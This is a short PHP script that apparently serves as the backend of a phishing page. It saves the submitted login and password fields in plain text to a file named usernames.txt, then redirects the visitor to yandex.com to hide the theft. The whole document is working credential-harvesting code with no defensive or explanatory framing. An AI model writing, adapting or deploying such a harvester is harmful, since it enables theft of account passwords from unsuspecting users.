<?php

file_put_contents("usernames.txt", "Account: " . $_POST['login'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://yandex.com');
exit();
